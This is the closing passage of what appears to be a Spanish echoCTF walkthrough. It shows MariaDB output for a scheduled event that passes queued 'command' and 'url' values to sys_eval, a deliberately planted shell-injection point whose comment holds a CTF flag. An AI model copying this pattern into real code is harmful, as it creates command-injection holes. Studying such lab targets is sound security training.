             Definer: root@localhost
           Time zone: SYSTEM
                Type: RECURRING
          Execute at: NULL
      Interval value: 30
      Interval field: SECOND
              Starts: 2019-11-14 17:32:37
                Ends: NULL
              Status: ENABLED
          Originator: 0
character_set_client: utf8mb4
collation_connection: utf8mb4_general_ci
  Database Collation: utf8mb4_general_ci
1 row in set (0.00 sec)

MariaDB [scrapper]&gt; SHOW CREATE EVENT ev_crawl_pending_queue\G # Para ver el la configuración del evento seleccionado mediante su nombre.
SHOW CREATE EVENT ev_crawl_pending_queue\G
*************************** 1. row ***************************
               Event: ev_crawl_pending_queue
            sql_mode: NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
           time_zone: SYSTEM
        Create Event: CREATE DEFINER=`root`@`localhost` EVENT `ev_crawl_pending_queue` ON SCHEDULE EVERY 30 SECOND STARTS '2019-11-14 17:32:37' ON COMPLETION NOT PRESERVE ENABLE COMMENT 'Check for commands that have no output ETSCTF_3f2652090448df5042' DO BEGIN
  DECLARE pid,done INT;
  DECLARE _pcur CURSOR FOR SELECT id FROM queue;
  DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
  OPEN _pcur;
  read_loop: LOOP
    FETCH _pcur INTO pid;
    IF done THEN
      LEAVE read_loop;
    END IF;
  IF @debug IS NOT NULL THEN
    SELECT pid;
  END IF;
  UPDATE crawlers SET output=sys_eval(CONCAT(command, ' &quot;', url,'&quot;')) WHERE id=pid;
  DELETE FROM queue WHERE id=pid;
  END LOOP;
  CLOSE _pcur;
END
character_set_client: utf8mb4
collation_connection: utf8mb4_general_ci
  Database Collation: utf8mb4_general_ci
1 row in set (0.00 sec)
</code></pre>
<h2 id="referencias"><a class="header" href="#referencias">Referencias</a></h2>
<ul>
<li><a href="https://es.wikipedia.org/wiki/Web_scraping">Definición Web Scrapping</a>.</li>
<li><a href="https://www.w3.org/wiki/HashURI">W3C - Hash URI</a>.</li>
<li><a href="https://www.jenitennison.com/2011/03/06/hash-uris.html">Jeni Tennison - Hash URIs</a>.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/event-scheduler.html">MySQL Reference Manual - Using the Event Scheduler</a>.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/show-events.html">MySQL Reference Manual - SHOW EVENTS Statement</a>.</li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/show-create-event.html">MySQL Reference Manual - SHOW CREATE EVENT Statement</a>.</li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../../echoCTF/targets/2_basic/Smithers/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../../../echoCTF/targets/5_expert/hajmetr/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../../echoCTF/targets/2_basic/Smithers/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../../../echoCTF/targets/5_expert/hajmetr/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
